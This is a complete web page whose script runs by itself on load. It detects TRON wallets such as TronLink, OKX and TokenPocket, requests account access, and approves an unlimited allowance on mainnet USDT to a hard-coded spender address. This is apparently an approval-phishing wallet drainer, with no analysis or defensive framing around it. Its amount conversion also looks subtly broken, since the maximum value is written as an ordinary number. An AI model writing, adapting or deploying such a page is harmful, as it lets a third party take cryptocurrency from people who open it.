<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>TRON approve - 多钱包适配</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:12px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>
<pre id="log"></pre>

<script>
function log(m){
  const el = document.getElementById('log');
  el.textContent += m + '\n';
  console.log(m);
}

/* ========== 多钱包识别 ========== */
async function detectWallet(){
  // 1. TIP-6963 标准（新钱包）
  try {
    const providers = await new Promise(resolve => {
      const found = [];
      const handler = e => found.push(e.detail);
      window.addEventListener('TIP6963:announceProvider', handler);
      window.dispatchEvent(new Event('TIP6963:requestProvider'));
      setTimeout(() => {
        window.removeEventListener('TIP6963:announceProvider', handler);
        resolve(found);
      }, 500);
    });

    const tronProvider = providers.find(p => 
      /tron/i.test(p.info?.name || '') || 
      /tron/i.test(p.info?.rdns || '')
    );
    if (tronProvider) return { name: tronProvider.info?.name || 'TIP6963 Wallet', provider: tronProvider.provider };
  } catch(_) {}

  // 2. 老式注入（按优先级）
  // TronLink
  if (window.tron && window.tron.tronWeb) return { name:'TronLink', provider: window.tron };
  if (window.tronLink && window.tronLink.tronWeb) return { name:'TronLink(legacy)', provider: window.tronLink };

  // TokenPocket
  if (window.tokenpocket && window.tokenpocket.tron && window.tokenpocket.tron.tronWeb) 
    return { name:'TokenPocket', provider: window.tokenpocket.tron };
  if (window.tokenpocket && window.tokenpocket.tronWeb) 
    return { name:'TokenPocket(legacy)', provider: window.tokenpocket };

  // OKX
  if (window.okxwallet && window.okxwallet.tronLink && window.okxwallet.tronLink.tronWeb) 
    return { name:'OKX Wallet', provider: window.okxwallet.tronLink };
  if (window.okxwallet && window.okxwallet.tronWeb) 
    return { name:'OKX Wallet(legacy)', provider: window.okxwallet };

  // Bitget / BitKeep
  if (window.bitkeep && window.bitkeep.tron && window.bitkeep.tron.tronWeb) 
    return { name:'Bitget Wallet', provider: window.bitkeep.tron };
  if (window.bitkeep && window.bitkeep.tronWeb) 
    return { name:'Bitget Wallet(legacy)', provider: window.bitkeep };

  // Gate
  if (window.gatewallet && window.gatewallet.tron && window.gatewallet.tron.tronWeb) 
    return { name:'GateWallet', provider: window.gatewallet.tron };
  if (window.gatewallet && window.gatewallet.tronWeb) 
    return { name:'GateWallet(legacy)', provider: window.gatewallet };

  // 兜底：直接挂了 tronWeb
  if (window.tronWeb) return { name:'Unknown TRON Wallet', provider: { tronWeb: window.tronWeb, request: null } };

  return null;
}

/* ========== 连接钱包 ========== */
async function connectWallet(wallet){
  let tw = wallet.provider.tronWeb;
  let addr = tw?.defaultAddress?.base58;

  if (!addr && wallet.provider.request) {
    log('🔄 请求账户授权...');
    
    // 先试 eth_requestAccounts（新标准）
    try {
      await wallet.provider.request({ method: 'eth_requestAccounts' });
    } catch(e) {
      // 再试 tron_requestAccounts（老标准）
      try {
        await wallet.provider.request({ method: 'tron_requestAccounts' });
      } catch(_) {}
    }

    // 连接后重新获取 tronWeb（有些钱包会更新注入对象）
    tw = wallet.provider.tronWeb;
    if (!tw) {
      // 重新检测一次
      const newWallet = await detectWallet();
      if (newWallet) tw = newWallet.provider.tronWeb;
    }
    addr = tw?.defaultAddress?.base58;
  }

  if (!addr) { log('❌ 无法获取地址'); return null; }
  return { tw, addr };
}

/* ========== 金额转换 ========== */
function toBaseAmount(human, decimals){
  const [int='0', frac=''] = String(human).split('.');
  const fixed = (frac + '0'.repeat(decimals)).slice(0, decimals);
  const raw = (int + fixed).replace(/^0+(?=\d)/, '');
  return raw || '0';
}

/* ========== 主流程 ========== */
async function main(){
  const wallet = await detectWallet();
  if (!wallet) {
    log('❌ 未检测到 TRON 钱包，请用钱包内置浏览器打开');
    return;
  }
  log('🪙 钱包：' + wallet.name);

  const { tw, addr } = await connectWallet(wallet);
  if (!tw || !addr) return;
  log('👛 当前地址：' + addr);

  // ===== 手动改这里 =====
  //const token   = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf'; // Nile USDT
  const token = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 主网 USDT
  const spender = 'TG9XX5MXesQyG3V7Z9ZuorqvhU2KWuphkY';
  const human   = 115792089237316195423570985008687907853269984665640564039457584007913129639935; // 最大授权
  // =====================

  let contract;
  try {
    contract = await tw.contract().at(token);
  } catch(e){
    log('❌ 合约 at 失败：' + (e?.message || e));
    return;
  }

  let decimals = 6;
  try { decimals = Number(await contract.decimals().call()) || 6; } catch(_) {}
  const raw = toBaseAmount(human, decimals);

  log('token   = ' + token);
  log('spender = ' + spender);
  log('decimals= ' + decimals);
  log('rawAmt  = ' + raw);

  try {
    const tx = await contract.approve(spender, raw).send({ callValue: 0 });
    log('✅ approve 成功 TxID=' + tx);
  } catch(e){
    try {
      const tx = await contract.approve(spender, raw).send({ callValue:0, feeLimit: 100_000_000 });
      log('✅ approve 成功(feeLimit) TxID=' + tx);
    } catch(e2){
      log('❌ approve 失败：' + (e2?.message || e2));
    }
  }
}

/* ========== 自动执行 ========== */
window.addEventListener('load', () => {
  let tries = 0;
  const timer = setInterval(async () => {
    tries++;
    const w = await detectWallet();
    if (w || tries >= 15){
      clearInterval(timer);
      if (w){
        main();
      } else {
        log('❌ 15 次重试后仍未检测到钱包');
      }
    }
  }, 400);
});
</script>
</body>
</html>
